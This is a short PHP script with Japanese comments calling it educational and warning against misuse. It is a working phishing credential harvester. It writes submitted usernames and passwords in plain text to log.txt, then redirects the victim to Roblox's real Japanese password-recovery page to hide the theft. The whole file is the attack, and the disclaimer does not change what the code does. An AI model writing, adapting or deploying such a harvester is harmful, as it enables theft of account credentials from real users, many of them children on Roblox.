<?php
// これは教育目的のために作成したコードなので、悪用しないでください。
// このコードは、ユーザーのログイン情報を取得するためのものです。
// ただし、実際の攻撃を行うことは違法であり、倫理的にも許されません。
// このコードを使用することで、他人に危害を加えることは絶対に避けてください。
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $u = $_POST["username"] ?? 'none';
   $p = $_POST["password"] ?? 'none';

   $log = "login: $u / pass: $p\n";

   file_put_contents("log.txt", $log, FILE_APPEND);



    header("Location: https://www.roblox.com/ja/login/forgot-password-or-username");
    exit;
}
?>
